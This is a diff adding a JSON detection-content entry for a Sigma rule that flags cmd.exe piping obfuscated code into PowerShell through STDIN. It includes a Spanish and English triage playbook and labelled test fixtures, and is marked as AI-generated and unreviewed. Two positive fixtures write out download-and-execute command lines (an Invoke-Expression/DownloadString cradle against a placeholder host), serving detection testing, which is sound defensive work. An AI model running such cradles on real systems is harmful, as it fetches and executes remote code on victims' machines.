@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "6c96fc76-0eb1-11eb-adc1-0242ac120002",
+    "title": "Invoke-Obfuscation STDIN+ Launcher",
+    "level": "high",
+    "status": "test",
+    "author": "Jonathan Cheong, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_stdin.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_stdin.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "cmd.exe pasó comandos a PowerShell a través de la entrada estándar (STDIN), con el patrón que genera Invoke-Obfuscation. Suele indicar un intento de ejecutar código ofuscado sin escribir un script en disco.",
+      "what_it_detects": "Un CommandLine en el que cmd con /c o /r redirige texto con echo hacia powershell y usa $input, ${input} o -noexit para leer y ejecutar lo que llega por STDIN. El regex distingue mayúsculas y minúsculas.",
+      "why_it_matters": "Al enviar el código por un pipe, el comando real no aparece en los argumentos de PowerShell y se dificulta la detección (T1027, ofuscación). Termina en ejecución de PowerShell (T1059.001), a menudo con descargas tipo DownloadString.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique lo que se envía con echo (Invoke-Expression, DownloadString, Net.WebClient, cadenas base64) y cualquier URL o IP.",
+        "Revise ParentImage y ParentCommandLine: Office, navegadores, wscript, mshta o servicios como padre son muy sospechosos.",
+        "Confirme el User y el host; valide si la cuenta suele ejecutar tareas administrativas desde cmd.",
+        "Revise los procesos hijos de powershell.exe y la actividad de red del host en una ventana de +/- 15 minutos.",
+        "Busque los logs de PowerShell Script Block (4104) del mismo host para ver el código ya desofuscado.",
+        "Busque el mismo patrón, incluidas variantes con mayúsculas y minúsculas, en otros hosts y alertas previas del usuario."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Herramientas de administración o scripts heredados que ejecutan PowerShell con echo y un pipe; valide el script origen y su responsable.",
+        "Ejercicios de red team o pruebas de detección autorizadas con Invoke-Obfuscation."
+      ],
+      "response_steps": [
+        "Valide con el dueño del host o del script si la ejecución estaba prevista; si no lo estaba, trátela como incidente.",
+        "Aísle el endpoint desde el EDR y bloquee las URL, dominios o IP del payload en el proxy y el firewall.",
+        "Recolecte artefactos: logs 4104, hashes de archivos descargados, persistencia (Run keys, tareas programadas, servicios).",
+        "Restablezca las credenciales del usuario afectado si hay indicios de robo de credenciales.",
+        "Elimine la persistencia verificada y restaure el host desde una imagen confiable antes de reincorporarlo."
+      ],
+      "severity_rationale": "Es alta porque cmd enviando código a PowerShell por STDIN es una técnica de ofuscación casi siempre maliciosa y con pocos usos legítimos."
+    },
+    "en": {
+      "summary": "cmd.exe piped commands into PowerShell through standard input (STDIN), using the pattern that Invoke-Obfuscation produces. This usually means someone is trying to run obfuscated code without writing a script to disk.",
+      "what_it_detects": "A CommandLine where cmd with /c or /r echoes text into powershell, and $input, ${input} or -noexit reads and runs it from STDIN. The regex is case-sensitive.",
+      "why_it_matters": "Piping the code hides the real command from PowerShell's arguments, which is obfuscation (T1027). It ends in PowerShell execution (T1059.001), often a download cradle such as DownloadString.",
+      "triage_steps": [
+        "Read the full CommandLine. Find what is echoed (Invoke-Expression, DownloadString, Net.WebClient, base64 strings) and note any URL or IP.",
+        "Check ParentImage and ParentCommandLine. A parent such as Office, a browser, wscript, mshta or a service is highly suspicious.",
+        "Confirm the User and host. Check whether this account normally runs admin tasks from cmd.",
+        "Check powershell.exe child processes and the host's network activity within +/- 15 minutes.",
+        "Pull PowerShell Script Block logs (4104) from the same host to see the deobfuscated code.",
+        "Hunt for the same pattern, including mixed-case variants, on other hosts and in earlier alerts for this user."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Admin tools or legacy scripts that pipe echo output into PowerShell. Check the source script and who owns it.",
+        "Authorized red team or detection-testing exercises that use Invoke-Obfuscation."
+      ],
+      "response_steps": [
+        "Ask the host or script owner whether the run was expected. If it was not, treat it as an incident.",
+        "Isolate the endpoint through EDR. Block the payload's URLs, domains or IPs at the proxy and firewall.",
+        "Collect artifacts: 4104 logs, hashes of downloaded files, and persistence (Run keys, scheduled tasks, services).",
+        "Reset the affected user's credentials if there are signs they were stolen.",
+        "Remove confirmed persistence and reimage the host from a trusted image before returning it to service."
+      ],
+      "severity_rationale": "High, because cmd piping code into PowerShell through STDIN is an obfuscation technique with few legitimate uses."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "cmd /c echoes a download cradle into powershell -noexit - (STDIN launcher)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c \"echo Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1') | powershell -noexit -\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n C:\\Users\\jperez\\Downloads\\factura.docm"
+        }
+      },
+      {
+        "description": "cmd /c pipes into powershell, which runs $input via ExecutionContext InvokeScript",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \" echo Invoke-Expression (New-Object Net.WebClient).DownloadString | powershell -nol ${executioncontext}.invokecommand.invokescript( $input )\"",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "wscript.exe C:\\Users\\mrojas\\AppData\\Local\\Temp\\update.js"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate cmd /c launching a PowerShell script file, with no STDIN input or noexit",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-BKP-01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c \"powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1\"",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"
+        }
+      },
+      {
+        "description": "PowerShell started directly from explorer with -NoExit, with no cmd /c pipe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoExit -Command \"Get-Process\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
